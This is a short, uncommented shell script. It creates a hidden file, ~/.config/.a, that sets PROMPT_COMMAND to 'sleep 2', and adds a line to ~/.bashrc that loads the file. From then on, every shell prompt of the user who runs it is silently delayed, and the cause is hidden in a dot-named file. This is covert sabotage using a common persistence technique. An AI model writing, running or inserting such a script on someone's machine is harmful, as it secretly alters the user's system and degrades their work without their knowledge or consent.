#!/bin/sh

hidden_file="$HOME/.config/.a"

mkdir -p "$HOME/.config"

echo "export PROMPT_COMMAND='sleep 2'" > "$hidden_file"

if ! grep -Fxq "source $hidden_file" "$HOME/.bashrc"; then
    echo "source $hidden_file" >> "$HOME/.bashrc"
fi
